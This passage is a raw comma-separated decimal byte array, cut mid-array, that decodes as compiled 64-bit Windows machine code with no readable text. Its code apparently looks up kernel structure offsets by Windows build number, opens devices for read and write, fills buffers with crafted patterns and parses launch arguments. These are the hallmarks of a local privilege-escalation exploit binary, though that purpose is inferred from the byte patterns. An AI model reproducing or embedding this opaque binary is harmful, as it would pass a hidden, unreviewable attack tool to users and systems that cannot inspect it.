,67,16,72,131,120,8,4,116,17,255,193,72,131,192,40,137,76,36,88,76,57,35,119,234,235,3,76,139,32,72,139,21,72,75,1,0,72,139,66,88,76,137,98,64,15,183,136,32,1,0,0,129,249,186,71,0,0,119,122,15,132,152,0,0,0,129,249,215,58,0,0,119,75,116,36,129,249,177,29,0,0,116,49,129,249,240,35,0,0,116,32,129,249,128,37,0,0,116,24,129,249,57,56,0,0,15,133,153,0,0,0,199,66,52,88,3,0,0,233,134,0,0,0,199,66,52,72,3,0,0,235,125,199,66,48,246,1,0,0,199,66,52,8,2,0,0,235,116,129,249,171,63,0,0,116,211,129,249,238,66,0,0,116,203,129,249,99,69,0,0,117,92,199,66,52,88,3,0,0,235,76,129,249,100,74,0,0,119,37,116,59,129,233,187,71,0,0,116,18,129,233,166,2,0,0,116,43,131,233,1,116,38,131,249,1,235,31,199,66,52,96,3,0,0,235,31,129,249,124,79,0,0,116,16,129,249,240,85,0,0,116,8,129,249,93,88,0,0,117,14,199,66,52,184,4,0,0,199,66,48,50,2,0,0,139,74,48,184,1,0,0,0,72,3,74,72,72,137,74,56,72,139,188,36,144,0,0,0,72,139,180,36,176,0,0,0,72,139,156,36,160,0,0,0,76,139,164,36,136,0,0,0,72,139,76,36,104,72,51,204,232,103,11,0,0,72,129,196,152,0,0,0,195,185,1,0,0,0,255,21,44,36,0,0,204,185,1,0,0,0,255,21,32,36,0,0,204,51,192,235,175,185,1,0,0,0,255,21,16,36,0,0,204,204,204,204,204,204,204,204,72,137,92,36,8,72,137,108,36,16,72,137,116,36,24,72,137,124,36,32,65,87,72,129,236,144,2,0,0,72,139,5,196,65,0,0,72,51,196,72,137,132,36,128,2,0,0,69,51,255,72,199,68,36,80,0,0,16,0,68,137,124,36,40,72,141,13,9,66,0,0,69,51,201,199,68,36,32,4,0,0,0,186,0,0,0,192,69,141,71,3,255,21,71,36,0,0,72,131,248,255,15,132,172,7,0,0,72,139,200,255,21,140,33,0,0,69,51,201,68,137,124,36,40,186,0,0,0,192,199,68,36,32,4,0,0,0,69,141,71,3,72,141,13,132,65,0,0,255,21,14,36,0,0,72,131,248,255,15,132,115,7,0,0,72,139,200,255,21,83,33,0,0,186,0,16,0,0,69,141,79,4,185,0,0,80,0,65,184,0,48,0,0,255,21,193,33,0,0,72,133,192,15,132,71,7,0,0,72,139,13,25,73,1,0,69,141,79,4,186,0,16,0,0,65,184,0,48,0,0,72,137,65,112,72,185,0,0,0,16,1,0,0,0,255,21,142,33,0,0,72,133,192,15,132,20,7,0,0,72,139,13,230,72,1,0,187,64,0,0,0,72,139,81,112,72,137,65,120,139,203,15,31,128,0,0,0,0,72,137,16,72,137,80,8,72,137,80,16,72,141,64,64,72,137,80,216,72,137,80,224,72,137,80,232,72,137,80,240,72,137,80,248,72,131,233,1,117,215,72,141,13,216,41,0,0,232,123,244,255,255,72,139,13,148,72,1,0,72,139,81,112,72,137,2,72,137,66,8,72,137,66,16,72,141,82,64,72,137,66,216,72,137,66,224,72,137,66,232,72,137,66,240,72,137,66,248,72,131,235,1,117,215,72,141,13,168,41,0,0,232,59,244,255,255,72,139,21,84,72,1,0,72,139,74,112,72,137,65,8,72,139,74,120,72,139,66,56,72,137,65,8,72,139,13,153,65,0,0,72,131,249,255,15,132,86,6,0,0,141,83,8,65,184,0,122,0,0,255,21,200,32,0,0,72,139,248,72,133,192,15,132,59,6,0,0,76,137,124,36,48,68,141,67,7,199,68,36,40,128,0,0,0,72,141,13,36,65,0,0,69,51,201,199,68,36,32,3,0,0,0,186,0,0,0,192,255,21,238,31,0,0,69,51,201,69,51,192,72,139,200,186,0,8,0,0,72,139,216,255,21,207,31,0,0,76,141,76,36,72,76,137,124,36,32,65,184,0,122,0,0,72,139,215,72,139,203,255,21,163,31,0,0,72,139,203,255,21,186,31,0,0,139,79,104,69,139,199,72,3,207,102,68,59,127,4,115,39,72,141,151,254,1,0,0,15,31,0,15,183,1,72,141,73,2,102,137,2,72,141,146,0,2,0,0,15,183,71,4,65,255,192,68,59,192,124,227,139,71,16,72,141,87,112,131,240,1,199,71,40,113,0,0,0,131,224,253,72,141,79,113,65,184,0,80,0,0,137,71,16,232,164,23,0,0,72,184,102,102,102,102,102,102,102,102,69,139,207,72,137,135,217,21,0,0,72,137,135,225,21,0,0,72,137,135,233,21,0,0,72,137,135,241,21,0,0,72,137,135,249,21,0,0,72,139,5,22,71,1,0,68,139,87,104,199,135,197,21,0,0,96,21,0,0,76,3,215,199,135,193,21,0,0,144,21,0,0,199,135,209,21,0,0,8,240,253,193,199,135,213,21,0,0,48,0,0,0,68,137,191,225,21,0,0,72,139,72,120,15,183,71,4,72,137,143,233,21,0,0,68,137,127,12,102,68,59,248,115,106,73,139,215,76,141,135,254,1,0,0,65,187,80,0,0,0,15,31,128,0,0,0,0,65,15,183,0,77,141,128,0,2,0,0,102,65,137,4,82,65,255,193,15,183,71,4,185,32,0,0,0,65,59,193,184,16,0,0,0,102,65,15,69,207,72,133,210,102,65,15,68,195,72,255,194,102,11,200,15,182,71,2,102,193,224,8,102,11,200,102,65,137,136,0,254,255,255,15,183,71,4,68,59,200,124,173,131,103,16,253,76,139,207,131,79,16,1,186,255,255,255,255,68,15,183,192,65,193,224,9,69,133,192,116,45,76,141,21,105,34,0,0,102,15,31,132,0,0,0,0,0,65,15,182,9,77,141,73,1,139,194,193,234,8,72,51,200,15,182,193,65,51,20,130,65,131,192,255,117,227,247,210,76,137,124,36,48,69,51,201,137,87,12,199,68,36,40,128,0,0,0,72,141,13,31,63,0,0,186,0,0,0,192,199,68,36,32,3,0,0,0,69,141,65,7,255,21,232,29,0,0,69,51,201,69,51,192,72,139,200,186,0,8,0,0,72,139,216,255,21,201,29,0,0,76,141,76,36,72,76,137,124,36,32,65,184,0,122,0,0,72,139,215,72,139,203,255,21,165,29,0,0,72,139,203,255,21,180,29,0,0,72,141,84,36,64,72,199,68,36,64,255,255,255,255,232,1,244,255,255,51,210,72,141,76,36,112,65,184,8,2,0,0,72,141,184,152,3,0,0,232,177,20,0,0,255,21,18,32,0,0,68,15,183,192,72,141,21,255,61,0,0,72,141,76,36,112,255,21,100,30,0,0,72,139,76,36,64,76,141,68,36,112,69,51,201,72,141,84,36,80,255,21,4,32,0,0,133,192,15,132,99,3,0,0,186,40,0,0,0,65,184,255,1,0,0,232,28,237,255,255,190,2,0,0,0,186,132,0,0,0,68,139,198,232,10,237,255,255,186,136,0,0,0,68,141,70,2,232,252,236,255,255,186,138,0,0,0,68,141,70,3,232,238,236,255,255,186,144,0,0,0,68,141,70,255,232,224,236,255,255,186,148,0,0,0,68,141,70,1,232,210,236,255,255,68,139,198,186,156,0,0,0,232,197,236,255,255,141,86,102,68,141,70,38,232,185,236,255,255,72,139,13,34,62,0,0,72,131,249,255,15,132,223,2,0,0,141,86,6,65,184,0,0,1,0,255,21,81,29,0,0,72,139,232,72,133,192,15,132,196,2,0,0,76,137,124,36,48,68,141,70,5,199,68,36,40,128,0,0,0,72,141,13,117,61,0,0,69,51,201,199,68,36,32,3,0,0,0,186,0,0,0,192,255,21,119,28,0,0,69,51,201,141,86,110,72,139,200,69,51,192,72,139,216,255,21,90,28,0,0,76,141,76,36,72,76,137,124,36,32,65,184,0,1,0,0,72,139,213,72,139,203,255,21,46,28,0,0,72,139,203,255,21,69,28,0,0,76,137,124,36,48,68,141,70,5,199,68,36,40,128,0,0,0,72,141,13,13,61,0,0,69,51,201,199,68,36,32,3,0,0,0,186,0,0,0,192,255,21,15,28,0,0,69,51,201,69,51,192,72,139,200,186,255,1,0,0,72,139,216,255,21,240,27,0,0,76,141,76,36,72,76,137,124,36,32,65,184,0,1,0,0,72,139,213,72,139,203,255,21,204,27,0,0,72,139,203,255,21,219,27,0,0,68,139,198,186,19,3,0,0,232,174,235,255,255,186,23,3,0,0,68,141,70,7,232,160,235,255,255,186,25,3,0,0,68,141,70,7,232,146,235,255,255,69,51,192,186,27,3,0,0,232,133,235,255,255,186,31,3,0,0,68,141,70,7,232,119,235,255,255,186,35,3,0,0,68,141,70,1,232,105,235,255,255,68,139,198,186,43,3,0,0,232,92,235,255,255,186,152,27,0,0,65,184,200,101,0,0,232,76,235,255,255,186,152,149,0,0,65,184,200,101,0,0,232,60,235,255,255,51,210,65,184,0,4,0,0,232,223,235,255,255,186,0,8,0,0,65,184,0,122,0,0,232,207,235,255,255,186,0,130,0,0,65,184,0,122,0,0,232,191,235,255,255,72,139,13,120,60,0,0,72,131,249,255,15,132,53,1,0,0,141,86,6,65,184,160,0,0,0,255,21,167,27,0,0,72,139,232,72,133,192,15,132,26,1,0,0,72,139,200,72,137,57,72,137,121,8,72,137,121,16,72,141,73,64,72,137,121,216,72,137,121,224,72,137,121,232,72,137,121,240,72,137,121,248,72,131,238,1,117,215,72,137,57,76,139,197,72,137,121,8,72,137,121,16,72,137,121,24,185,0,32,0,0,232,187,236,255,255,76,139,197,185,0,0,2,0,72,139,216,232,171,236,255,255,72,139,203,72,139,240,232,224,237,255,255,72,139,206,232,216,237,255,255,139,78,4,129,249,0,16,0,0,118,7,189,14,0,0,0,235,11,51,210,184,0,16,0,0,247,241,139,232,65,139,255,68,57,62,118,85,15,31,0,51,210,139,199,247,245,133,210,117,66,139,223,72,255,195,72,193,227,4,72,3,222,72,131,59,255,116,48,72,139,75,8,72,131,249,255,116,38,255,21,68,26,0,0,133,192,116,87,72,139,11,72,199,67,8,255,255,255,255,255,21,47,26,0,0,133,192,116,66,72,199,3,255,255,255,255,255,199,59,62,114,174,69,51,201,68,137,124,36,40,186,0,0,0,192,199,68,36,32,4,0,0,0,72,141,13,82,58,0,0,69,141,65,3,255,21,160,28,0,0,72,139,216,72,131,248,255,117,18,255,21,41,26,0,0,185,1,0,0,0,255,21,230,27,0,0,204,69,51,201,76,141,5,35,35,0,0,72,141,84,36,80,72,139,203,255,21,117,28,0,0,72,139,203,255,21,188,25,0,0,72,139,5,165,65,1,0,76,141,68,36,76,72,139,76,36,64,72,141,84,36,88,15,87,192,199,68,36,76,1,0,0,0,65,185,1,0,0,0,199,68,36,32,13,0,0,0,15,17,68,36,88,255,80,40,72,139,76,36,64,255,21,122,25,0,0,72,141,76,36,112,255,21,199,25,0,0,72,141,13,72,58,0,0,255,21,186,25,0,0,72,141,13,11,58,0,0,255,21,173,25,0,0,72,141,13,102,58,0,0,255,21,160,25,0,0,72,139,140,36,128,2,0,0,72,51,204,232,104,2,0,0,76,141,156,36,144,2,0,0,73,139,91,16,73,139,107,24,73,139,115,32,73,139,123,40,73,139,227,65,95,195,204,204,204,204,204,204,204,204,204,204,72,137,92,36,8,87,72,129,236,80,1,0,0,72,139,5,228,56,0,0,72,51,196,72,137,132,36,64,1,0,0,72,139,66,8,72,139,218,128,56,45,15,133,233,1,0,0,128,120,1,99,117,18,128,120,2,0,117,12,255,21,63,25,0,0,72,139,123,16,235,41,128,56,45,15,133,200,1,0,0,128,120,1,112,15,133,190,1,0,0,128,120,2,0,15,133,180,1,0,0,72,139,74,16,51,255,255,21,240,25,0,0,137,5,146,64,1,0,72,137,61,147,64,1,0,255,21,165,24,0,0,72,141,13,102,57,0,0,72,137,5,207,57,0,0,255,21,209,24,0,0,72,141,13,34,57,0,0,255,21,196,24,0,0,72,141,13,125,57,0,0,255,21,183,24,0,0,232,218,240,255,255,51,201,255,21,210,26,0,0,72,139,200,255,21,225,26,0,0,232,68,246,255,255,51,210,72,141,76,36,64,65,184,0,1,0,0,232,91,15,0,0,72,139,5,27,64,1,0,72,141,21,4,33,0,0,72,139,8,255,21,123,24,0,0,72,133,192,15,132,14,1,0,0,72,139,13,251,63,1,0,72,141,21,180,32,0,0,72,137,65,24,72,139,9,255,21,87,24,0,0,72,133,192,15,132,234,0,0,0,76,139,21,215,63,1,0,76,141,68,36,64,65,185,8,0,0,0,65,139,82,52,73,3,82,64,73,139,74,96,73,137,66,16,72,141,68,36,48,72,137,68,36,32,65,255,82,24,133,192,121,44,72,141,13,171,32,0,0,232,78,233,255,255,255,21,232,23,0,0,139,208,72,141,13,183,32,0,0,232,58,233,255,255,185,1,0,0,0,255,21,151,25,0,0,204,72,139,5,119,63,1,0,72,141,76,36,48,72,137,76,36,32,76,141,68,36,64,65,185,8,0,0,0,139,80,52,72,3,80,80,72,139,72,96,255,80,16,72,199,68,36,64,1,0,0,0,72,141,68,36,48,72,137,68,36,32,76,141,68,36,64,72,139,5,53,63,1,0,65,185,1,0,0,0,72,139,80,56,72,139,72,96,255,80,16,72,139,13,45,63,1,0,255,21,55,25,0,0,51,192,72,139,140,36,64,1,0,0,72,51,204,232,69,0,0,0,72,139,156,36,96,1,0,0,72,129,196,80,1,0,0,95,195,185,1,0,0,0,255,21,1,25,0,0,204,51,201,255,21,248,24,0,0,204,204,204,204,204,204,204,204,204,204,204,204,204,204,204,204,204,204,204,204,204,204,102,102,15,31,132,0,0,0,0,0,72,59,13,177,54,0,0,117,16,72,193,193,16,102,247,193,255,255,117,1,195,72,193,201,16,233,114,0,0,0,204,204,64,83,72,131,236,32,72,139,217,235,15,72,139,203,232,222,13,0,0,133,192,116,19,72,139,203,232,204,13,0,0,72,133,192,116,231,72,131,196,32,91,195,72,131,251,255,116,6,232,59,5,0,0,204,232,85,5,0,0,204,64,83,72,131,236,32,72,139,217,51,201,255,21,3,23,0,0,72,139,203,255,21,66,23,0,0,255,21,116,22,0,0,72,139,200,186,9,4,0,192,72,131,196,32,91,72,255,37,232,22,0,0,72,137,76,36,8,72,131,236,56,185,23,0,0,0,255,21,220,22,0,0,133,192,116,7,185,2,0,0,0,205,41,72,141,13,186,56,0,0,232,169,0,0,0,72,139,68,36,56,72,137,5,161,57,0,0,72,141,68,36,56,72,131,192,8,72,137,5,49,57,0,0,72,139,5,138,57,0,0,72,137,5,251,55,0,0,72,139,68,36,64,72,137,5,255,56,0,0,199,5,213,55,0,0,9,4,0,192,199,5,207,55,0,0,1,0,0,0,199,5,217,55,0,0,1,0,0,0,184,8,0,0,0,72,107,192,0,72,141,13,209,55,0,0,72,199,4,1,2,0,0,0,184,8,0,0,0,72,107,192,0,72,139,13,129,53,0,0,72,137,76,4,32,184,8,0,0,0,72,107,192,1,72,139,13,100,53,0,0,72,137,76,4,32,72,141,13,216,24,0,0,232,255,254,255,255,72,131,196,56,195,204,204,64,83,86,87,72,131,236,64,72,139,217,255,21,35,24,0,0,72,139,179,248,0,0,0,51,255,69,51,192,72,141,84,36,96,72,139,206,255,21,1,24,0,0,72,133,192,116,57,72,131,100,36,56,0,72,141,76,36,104,72,139,84,36,96,76,139,200,72,137,76,36,48,76,139,198,72,141,76,36,112,72,137,76,36,40,51,201,72,137,92,36,32,255,21,218,23,0,0,255,199,131,255,2,124,177,72,131,196,64,95,94,91,195,204,204,204,64,83,72,131,236,32,185,1,0,0,0,232,53,12,0,0,232,255,6,0,0,139,200,232,89,12,0,0,232,231,6,0,0,139,216,232,125,12,0,0,185,1,0,0,0,137,24,232,96,4,0,0,132,192,116,115,232,83,9,0,0,72,141,13,136,9,0,0,232,251,5,0,0,232,190,6,0,0,139,200,232,252,11,0,0,133,192,117,82,232,190,6,0,0,232,245,6,0,0,133,192,116,12,72,141,13,154,6,0,0,232,216,11,0,0,232,184,6,0,0,232,179,6,0,0,232,134,6,0,0,139,200,232,16,12,0,0,232,158,6,0,0,132,192,116,5,232,192,11,0,0,232,108,6,0,0,232,39,8,0,0,133,192,117,6,72,131,196,32,91,195,185,7,0,0,0,232,199,6,0,0,204,204,204,72,131,236,40,232,123,6,0,0,51,192,72,131,196,40,195,72,131,236,40,232,83,8,0,0,232,50,6,0,0,139,200,72,131,196,40,233,190,11,0,0,204,204,204,72,137,92,36,8,72,137,116,36,16,87,72,131,236,48,185,1,0,0,0,232,75,3,0,0,132,192,15,132,54,1,0,0,64,50,246,64,136,116,36,32,232,250,2,0,0,138,216,139,13,78,59,0,0,131,249,1,15,132,35,1,0,0,133,201,117,74,199,5,55,59,0,0,1,0,0,0,72,141,21,248,22,0,0,72,141,13,217,22,0,0,232,37,11,0,0,133,192,116,10,184,255,0,0,0,233,217,0,0,0,72,141,21,183,22,0,0,72,141,13,160,22,0,0,232,254,10,0,0,199,5,249,58,0,0,2,0,0,0,235,8,64,182,1,64,136,116,36,32,138,203,232,56,4,0,0,232,223,5,0,0,72,139,216,72,131,56,0,116,30,72,139,200,232,138,3,0,0,132,192,116,18,69,51,192,65,141,80,2,51,201,72,139,3,255,21,60,22,0,0,232,187,5,0,0,72,139,216,72,131,56,0,116,20,72,139,200,232,94,3,0,0,132,192,116,8,72,139,11,232,197,10,0,0,232,138,10,0,0,72,139,248,232,166,10,0,0,72,139,24,232,152,10,0,0,76,139,199,72,139,211,139,8,232,248,249,255,255,139,216,232,217,6,0,0,132,192,116,85,64,132,246,117,5,232,130,10,0,0,51,210,177,1,232,206,3,0,0,139,195,235,25,139,216,232,183,6,0,0,132,192,116,59,128,124,36,32,0,117,5,232,100,10,0,0,139,195,72,139,92,36,64,72,139,116,36,72,72,131,196,48,95,195,185,7,0,0,0,232,55,5,0,0,144,185,7,0,0,0,232,44,5,0,0,139,203,232,208,9,0,0,144,139,203,232,16,10,0,0,144,72,131,236,40,232,243,3,0,0,72,131,196,40,233,114,254,255,255,204,204,64,83,72,131,236,32,72,139,217,72,139,194,72,141,13,233,21,0,0,15,87,192,72,137,11,72,141,83,8,72,141,72,8,15,17,2,232,102,9,0,0,72,141,5,252,21,0,0,72,137,3,72,139,195,72,131,196,32,91,195,72,131,97,16,0,72,141,5,244,21,0,0,72,137,65,8,72,141,5,217,21,0,0,72,137,1,72,139,193,195,204,204,64,83,72,131,236,32,72,139,217,72,139,194,72,141,13,141,21,0,0,15,87,192,72,137,11,72,141,83,8,72,141,72,8,15,17,2,232,10,9,0,0,72,141,5,200,21,0,0,72,137,3,72,139,195,72,131,196,32,91,195,72,131,97,16,0,72,141,5,192,21,0,0,72,137,65,8,72,141,5,165,21,0,0,72,137,1,72,139,193,195,204,204,64,83,72,131,236,32,72,139,217,72,139,194,72,141,13,49,21,0,0,15,87,192,72,137,11,72,141,83,8,72,141,72,8,15,17,2,232,174,8,0,0,72,139,195,72,131,196,32,91,195,204,204,72,141,5,9,21,0,0,72,137,1,72,131,193,8,233,150,8,0,0,204,72,137,92,36,8,87,72,131,236,32,72,141,5,235,20,0,0,72,139,249,72,137,1,139,218,72,131,193,8,232,115,8,0,0,246,195,1,116,13,186,24,0,0,0,72,139,207,232,96,6,0,0,72,139,92,36,48,72,139,199,72,131,196,32,95,195,204,204,72,131,236,72,72,141,76,36,32,232,234,254,255,255,72,141,21,163,36,0,0,72,141,76,36,32,232,56,8,0,0,204,72,131,236,72,72,141,76,36,32,232,38,255,255,255,72,141,21,11,37,0,0,72,141,76,36,32,232,24,8,0,0,204,72,131,121,8,0,72,141,5,124,20,0,0,72,15,69,65,8,195,204,204,72,131,236,40,232,203,7,0,0,133,192,116,33,101,72,139,4,37,48,0,0,0,72,139,72,8,235,5,72,59,200,116,20,51,192,240,72,15,177,13,56,56,0,0,117,238,50,192,72,131,196,40,195,176,1,235,247,204,204,204,64,83,72,131,236,32,15,182,5,35,56,0,0,133,201,187,1,0,0,0,15,68,195,136,5,19,56,0,0,232,210,5,0,0,232,189,2,0,0,132,192,117,4,50,192,235,20,232,176,2,0,0,132,192,117,9,51,201,232,165,2,0,0,235,234,138,195,72,131,196,32,91,195,204,204,204,64,83,72,131,236,32,128,61,216,55,0,0,0,139,217,117,103,131,249,1,119,106,232,49,7,0,0,133,192,116,40,133,219,117,36,72,141,13,194,55,0,0,232,232,7,0,0,133,192,117,16,72,141,13,202,55,0,0,232,216,7,0,0,133,192,116,46,50,192,235,51,102,15,111,5,21,20,0,0,72,131,200,255,243,15,127,5,145,55,0,0,72,137,5,154,55,0,0,243,15,127,5,154,55,0,0,72,137,5,163,55,0,0,198,5,109,55,0,0,1,176,1,72,131,196,32,91,195,185,5,0,0,0,232,94,2,0,0,204,204,72,131,236,24,76,139,193,184,77,90,0,0,102,57,5,165,207,255,255,117,120,72,99,13,216,207,255,255,72,141,21,149,207,255,255,72,3,202,129,57,80,69,0,0,117,95,184,11,2,0,0,102,57,65,24,117,84,76,43,194,15,183,65,20,72,141,81,24,72,3,208,15,183,65,6,72,141,12,128,76,141,12,202,72,137,20,36,73,59,209,116,24,139,74,12,76,59,193,114,10,139,66,8,3,193,76,59,192,114,8,72,131,194,40,235,223,51,210,72,133,210,117,4,50,192,235,20,131,122,36,0,125,4,50,192,235,10,176,1,235,6,50,192,235,2,50,192,72,131,196,24,195,64,83,72,131,236,32,138,217,232,27,6,0,0,51,210,133,192,116,11,132,219,117,7,72,135,21,154,54,0,0,72,131,196,32,91,195,64,83,72,131,236,32,128,61,143,54,0,0,0,138,217,116,4,132,210,117,12,232,54,1,0,0,138,203,232,47,1,0,0,176,1,72,131,196,32,91,195,204,204,204,64,83,72,131,236,32,72,131,61,106,54,0,0,255,72,139,217,117,7,232,151,6,0,0,235,15,72,139,211,72,141,13,84,54,0,0,232,128,6,0,0,51,210,133,192,72,15,68,211,72,139,194,72,131,196,32,91,195,204,204,72,131,236,40,232,187,255,255,255,72,247,216,27,192,247,216,255,200,72,131,196,40,195,204,72,137,92,36,32,85,72,139,236,72,131,236,32,72,139,5,112,46,0,0,72,187,50,162,223,45,153,43,0,0,72,59,195,117,116,72,131,101,24,0,72,141,77,24,255,21,66,15,0,0,72,139,69,24,72,137,69,16,255,21,60,15,0,0,139,192,72,49,69,16,255,21,192,14,0,0,139,192,72,141,77,32,72,49,69,16,255,21,248,14,0,0,139,69,32,72,141,77,16,72,193,224,32,72,51,69,32,72,51,69,16,72,51,193,72,185,255,255,255,255,255,255,0,0,72,35,193,72,185,51,162,223,45,153,43,0,0,72,59,195,72,15,68,193,72,137,5,237,45,0,0,72,139,92,36,72,72,247,208,72,137,5,214,45,0,0,72,131,196,32,93,195,51,192,195,204,184,1,0,0,0,195,204,204,184,0,64,0,0,195,204,204,72,141,13,149,53,0,0,72,255,37,158,14,0,0,204,204,176,1,195,204,194,0,0,204,72,141,5,141,53,0,0,195,72,131,236,40,232,67,223,255,255,72,131,8,36,232,230,255,255,255,72,131,8,2,72,131,196,40,195,204,51,192,57,5,140,45,0,0,15,148,192,195,72,141,5,165,53,1,0,195,72,141,5,149,53,1,0,195,131,37,85,53,0,0,0,195,72,137,92,36,8,85,72,141,172,36,64,251,255,255,72,129,236,192,5,0,0,139,217,185,23,0,0,0,255,21,10,14,0,0,133,192,116,4,139,203,205,41,185,3,0,0,0,232,196,255,255,255,51,210,72,141,77,240,65,184,208,4,0,0,232,96,4,0,0,72,141,77,240,255,21,245,15,0,0,72,139,157,232,0,0,0,72,141,149,216,4,0,0,72,139,203,69,51,192,255,21,211,15,0,0,72,133,192,116,60,72,131,100,36,56,0,72,141,141,224,4,0,0,72,139,149,216,4,0,0,76,139,200,72,137,76,36,48,76,139,195,72,141,141,232,4,0,0,72,137,76,36,40,72,141,77,240,72,137,76,36,32,51,201,255,21,162,15,0,0,72,139,133,200,4,0,0,72,141,76,36,80,72,137,133,232,0,0,0,51,210,72,141,133,200,4,0,0,65,184,152,0,0,0,72,131,192,8,72,137,133,136,0,0,0,232,201,3,0,0,72,139,133,200,4,0,0,72,137,68,36,96,199,68,36,80,21,0,0,64,199,68,36,84,1,0,0,0,255,21,70,13,0,0,131,248,1,72,141,68,36,80,72,137,68,36,64,72,141,69,240,15,148,195,72,137,68,36,72,51,201,255,21,253,12,0,0,72,141,76,36,64,255,21,58,13,0,0,133,192,117,12,132,219,117,8,141,72,3,232,190,254,255,255,72,139,156,36,208,5,0,0,72,129,196,192,5,0,0,93,195,204,233,59,254,255,255,204,204,204,72,131,236,40,51,201,255,21,220,12,0,0,72,133,192,116,58,185,77,90,0,0,102,57,8,117,48,72,99,72,60,72,3,200,129,57,80,69,0,0,117,33,184,11,2,0,0,102,57,65,24,117,22,131,185,132,0,0,0,14,118,13,131,185,248,0,0,0,0,116,4,176,1,235,2,50,192,72,131,196,40,195,204,204,72,141,13,9,0,0,0,72,255,37,102,12,0,0,204,204,72,137,92,36,8,87,72,131,236,32,72,139,25,72,139,249,129,59,99,115,109,224,117,28,131,123,24,4,117,22,139,83,32,141,130,224,250,108,230,131,248,2,118,21,129,250,0,64,153,1,116,13,72,139,92,36,48,51,192,72,131,196,32,95,195,232,155,2,0,0,72,137,24,72,139,95,8,232,149,2,0,0,72,137,24,232,47,3,0,0,204,204,72,137,92,36,8,87,72,131,236,32,72,141,29,15,28,0,0,72,141,61,8,28,0,0,235,18,72,139,3,72,133,192,116,6,255,21,48,14,0,0,72,131,195,8,72,59,223,114,233,72,139,92,36,48,72,131,196,32,95,195,72,137,92,36,8,87,72,131,236,32,72,141,29,227,27,0,0,72,141,61,220,27,0,0,235,18,72,139,3,72,133,192,116,6,255,21,244,13,0,0,72,131,195,8,72,59,223,114,233,72,139,92,36,48,72,131,196,32,95,195,233,235,1,0,0,204,204,204,64,83,72,131,236,32,72,141,5,243,14,0,0,72,139,217,72,137,1,246,194,1,116,10,186,24,0,0,0,232,214,255,255,255,72,139,195,72,131,196,32,91,195,204,72,137,92,36,16,72,137,116,36,24,87,72,131,236,16,51,192,51,201,15,162,68,139,193,69,51,219,68,139,203,65,129,240,110,116,101,108,65,129,241,71,101,110,117,68,139,210,139,240,51,201,65,141,67,1,69,11,200,15,162,65,129,242,105,110,101,73,137,4,36,69,11,202,137,92,36,4,139,249,137,76,36,8,137,84,36,12,117,80,72,131,13,91,42,0,0,255,37,240,63,255,15,61,192,6,1,0,116,40,61,96,6,2,0,116,33,61,112,6,2,0,116,26,5,176,249,252,255,131,248,32,119,36,72,185,1,0,1,0,1,0,0,0,72,15,163,193,115,20,68,139,5,8,50,0,0,65,131,200,1,68,137,5,253,49,0,0,235,7,68,139,5,244,49,0,0,184,7,0,0,0,68,141,72,251,59,240,124,38,51,201,15,162,137,4,36,68,139,219,137,92,36,4,137,76,36,8,137,84,36,12,15,186,227,9,115,10,69,11,193,68,137,5,193,49,0,0,199,5,199,41,0,0,1,0,0,0,68,137,13,196,41,0,0,15,186,231,20,15,131,145,0,0,0,68,137,13,175,41,0,0,187,6,0,0,0,137,29,168,41,0,0,15,186,231,27,115,121,15,186,231,28,115,115,51,201,15,1,208,72,193,226,32,72,11,208,72,137,84,36,32,72,139,68,36,32,34,195,58,195,117,87,139,5,122,41,0,0,131,200,8,199,5,105,41,0,0,3,0,0,0,137,5,103,41,0,0,65,246,195,32,116,56,131,200,32,199,5,80,41,0,0,5,0,0,0,137,5,78,41,0,0,184,0,0,3,208,68,35,216,68,59,216,117,24,72,139,68,36,32,36,224,60,224,117,13,131,13,47,41,0,0,64,137,29,37,41,0,0,72,139,92,36,40,51,192,72,139,116,36,48,72,131,196,16,95,195,204,204,204,51,192,57,5,32,41,0,0,15,149,192,195,204,204,204,204,204,204,204,204,204,204,204,204,233,48,0,0,0,255,37,37,10,0,0,255,37,23,10,0,0,255,37,9,10,0,0,255,37,235,9,0,0,255,37,21,10,0,0,255,37,231,9,0,0,255,37,233,9,0,0,255,37,211,10,0,0,255,37,37,10,0,0,255,37,47,10,0,0,255,37,33,10,0,0,255,37,179,10,0,0,255,37,125,10,0,0,255,37,63,10,0,0,255,37,89,10,0,0,255,37,67,10,0,0,255,37,69,10,0,0,255,37,167,10,0,0,255,37,73,10,0,0,255,37,75,10,0,0,255,37,221,10,0,0,255,37,79,10,0,0,255,37,81,10,0,0,255,37,83,10,0,0,255,37,85,10,0,0,255,37,87,10,0,0,255,37,225,9,0,0,255,37,203,9,0,0,255,37,165,10,0,0,255,37,127,10,0,0,255,37,97,10,0,0,255,37,99,10,0,0,255,37,101,10,0,0,204,72,131,236,40,77,139,65,56,72,139,202,73,139,209,232,13,0,0,0,184,1,0,0,0,72,131,196,40,195,204,204,204,64,83,69,139,24,72,139,218,65,131,227,248,76,139,201,65,246,0,4,76,139,209,116,19,65,139,64,8,77,99,80,4,247,216,76,3,209,72,99,200,76,35,209,73,99,195,74,139,20,16,72,139,67,16,139,72,8,72,139,67,8,246,68,1,3,15,116,11,15,182,68,1,3,131,224,240,76,3,200,76,51,202,73,139,201,91,233,233,240,255,255,255,37,243,8,0,0,204,204,204,204,204,204,204,204,204,102,102,15,31,132,0,0,0,0,0,255,224,204,204,204,204,204,204,204,204,204,204,204,204,204,204,204,204,204,204,204,204,102,102,15,31,132,0,0,0,0,0,255,37,106,10,0,0,64,85,72,131,236,32,72,139,234,72,139,1,72,139,209,139,8,232,171,254,255,255,144,72,131,196,32,93,195,204,64,85,72,139,234,72,139,1,51,201,129,56,5,0,0,192,15,148,193,139,193,93,195,204,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0